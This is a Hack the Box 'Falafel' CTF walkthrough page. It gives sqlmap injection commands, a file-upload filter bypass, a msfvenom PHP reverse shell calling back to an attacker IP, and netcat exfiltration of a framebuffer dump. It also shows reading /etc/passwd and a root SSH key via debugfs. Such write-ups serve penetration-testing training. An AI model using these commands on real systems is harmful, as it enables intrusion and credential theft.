@@ -1,0 +1,487 @@
+
+								
+																		Hack the Box Challenge: Falafel Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 14, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									In this Post, we are going to solve another CTF challenge “falafel” which is available online for those who want to increase their skill in penetration testing and black box testing. Falafel is a retired vulnerable lab presented by hack the box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to expert level.
+Level: Hard
+Task: find user.txt &amp; root.txt file on the victim’s machine
+Penetration Methodology 
+Scanning
+
+Open ports and Running services (Nmap)
+
+Enumeration 
+
+Enumerating Web Directory (Dirbuster)
+Identify Web application vulnerability 
+SQL Injection
+
+Exploiting Web Application Vulnerabilities 
+
+Login form SQL Injection
+File Upload 
+
+Spawning Shell
+
+Injecting PHP payload (Metasploit)
+Stealing SSH Credential
+SSH login
+Get user.txt
+
+Privilege Escalation 
+
+Cracking Frame-buffer Device (Cyber Forensic)
+Escalated root shell
+Get root.txt
+
+Walk-Through 
+Scanning
+Since these labs are online available therefore they have static IP and its IP is 10.10.10.73 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap –A 10.10.10.73
+			
+				
+					
+				
+					1
+				
+						nmap –A 10.10.10.73
+					
+				
+			
+		
+
+From its scanning result, we found port 22 and 80 are open for ssh and http services.
+
+So we explored target IP through the web browser and it put up a login page shown.
+
+Enumeration 
+When I didn’t found any remarkable things then I used Dirbuster for directory brute force attack. It put up so many files but /cyberlaw.txt looks more interesting so I browsed http://10.10.10.73/cyber.txt and put a message in front of me.
+
+By reading this message, I conclude that there is an admin account and which is facing major security issue and an attacker can easily take over the website using an image upload feature. Moreover, there is some hint on the URL filter.
+
+Then we try SQL injection on the login form but it gave an error “Wrong Identification: admin”
+
+Exploiting Web Application Vulnerabilities 
+Then we make more efforts for SQL injection by using SQLMAP and used “Wrong identification” as a string to be passed at the time of login.
+
+		
+		
+			
+			
+			
+			
+sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch
+					
+				
+			
+		
+
+
+As result, it dumps the database name “falafel” now let’s extract the whole database information.
+
+
+		
+		
+			
+			
+			
+			
+sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel --tables --batch
+sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel -T users --dump --batch
+			
+				
+					
+				
+					12
+				
+						sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel --tables --batchsqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel -T users --dump --batch
+					
+				
+			
+		
+
+So we got users tables from inside it and it has username and password as shown.
+
+As you can observe that the password hash for user admin is started with 0 and I don’t know much about this type of hash, so we look in the Google and notice link for Magic hashes.
+
+As you can observe the highlighted md5 hash for the 32-bit string is same as above……………………….
+
+With help of the following credential we login into admin dashboard and move to upload options.
+
+		
+		
+			
+			
+			
+			
+Username: admin
+Password: 240610708
+			
+				
+					
+				
+					12
+				
+						Username: adminPassword: 240610708
+					
+				
+			
+		
+
+
+Here we are trying to upload a php file named shell.php but it put an error “Bad extension “as shown
+Thereafter we renamed it as shell.php.png and again try to upload.
+
+Ohh! Yes, the file with .png extension get uploaded successfully inside /var/www/html/uploads hence we can to upload a malicious php file or any php backdoor with .png extension.
+
+Spawning Shell
+Let’s create a PHP payload for uploading into the web site. We have to use the msfvenom command for generating PHP backdoor.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw
+					
+				
+			
+		
+
+Now copy the code from *&lt;?php….die(); and paste in a text file then as rajjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj.php.png (240 character) also start multi handler in a new terminal.
+
+Let me make it clear to you, here the author has applied filter for identifying  240 character file which means your file name must contain 240 characters including extension.
+
+As shown in the given image the PHP file is uploaded successfully inside /var/www/html/uploads.
+
+Let execute it in the URL for obtaining reverse shell at Metasploit.
+
+Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.25
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.25msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe Meterpreter session 1. But the task is not finished yet, still, we need to penetrate more for privilege escalation. Further, we open passwd file and notice two system username i.e. yossi and moshe.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt; cat /etc/passwd
+			
+				
+					
+				
+					1
+				
+						meterpreter&gt; cat /etc/passwd
+					
+				
+			
+		
+
+
+After making some more inspection we found a file connection.php from inside /var/www/html and receive database credential from inside it.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt; cd /var/www/html
+meterpreter&gt; ls
+meterpreter&gt; cat /connection.php
+			
+				
+					
+				
+					123
+				
+						meterpreter&gt; cd /var/www/htmlmeterpreter&gt; lsmeterpreter&gt; cat /connection.php
+					
+				
+			
+		
+
+This is MySQL configuration file for MySQL where username is moshe and password is falafelIsReallyTasty
+
+With help of above credential we are trying to ssh login and after making successful login we found the user.txt file from inside /home/moshe
+
+		
+		
+			
+			
+			
+			
+ssh moshe@10.10.10.73
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cd /home                                                             
+cd moshe
+cat user.txt
+			
+				
+					
+				
+					12345
+				
+						ssh moshe@10.10.10.73python3 -c 'import pty;pty.spawn("/bin/bash")'cd /home                                                             cd moshecat user.txt
+					
+				
+			
+		
+
+
+Privilege Escalation 
+After some more penetration, we enumerated the groups for user moshe and found that the user is in the video group. When we found uses as the member of the video group then for Privilege Escalation we need check frame-buffer device. Because this can lead a local user able to access a frame buffer device file (/dev/fb*) could possibly use this flaw to escalate their privileges on the system.
+Let’s have the contents of /dev/fb0 with help of cat command to capture the framebuffer raw data inside /tmp directory as scree.raw
+
+		
+		
+			
+			
+			
+			
+groups
+cat /dev/fb0 &gt; /tmp/screen.raw
+cd /tmp
+ls
+nc 10.10.14.25 5555 &lt; screen.raw
+			
+				
+					
+				
+					12345
+				
+						groupscat /dev/fb0 &gt; /tmp/screen.rawcd /tmplsnc 10.10.14.25 5555 &lt; screen.raw
+					
+				
+			
+		
+
+So we have captured the raw data inside /tmp, now you need to take the raw image and convert it to a standard image format say .png but we before that we need to find t the size, use the following command which will print the dimension……………..
+
+		
+		
+			
+			
+			
+			
+cat /sys/class/graphics/fb0/virtual_size
+			
+				
+					
+				
+					1
+				
+						cat /sys/class/graphics/fb0/virtual_size
+					
+				
+			
+		
+
+
+Now enter the following command to convert raw data into a .png image format
+
+		
+		
+			
+			
+			
+			
+./iraw2png.pl 1176 885 &lt; screen.raw &gt; screen.png
+			
+				
+					
+				
+					1
+				
+						./iraw2png.pl 1176 885 &lt; screen.raw &gt; screen.png
+					
+				
+			
+		
+
+
+Then we opened screen.png and got the following image which was showing password: MoshePlzStopHackingMe! for user Yossi.
+
+With help of above-enumerated credential, we have made SSH login successfully and then run following command for getting SSH RSA key.
+
+		
+		
+			
+			
+			
+			
+df
+debugfs /dev/sda1
+cat /root/.ssh/id_rsa
+			
+				
+					
+				
+					123
+				
+						dfdebugfs /dev/sda1cat /root/.ssh/id_rsa
+					
+				
+			
+		
+
+
+Now copy the RSA key in a text file and named as key in your local machine. Also, give permission 600 to it. Then connect to ssh once again through above RSA file as given below:
+
+		
+		
+			
+			
+			
+			
+ssh -i key root@10.10.10.73
+ls
+cat root.txt
+			
+				
+					
+				
+					123
+				
+						ssh -i key root@10.10.10.73lscat root.txt
+					
+				
+			
+		
+
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
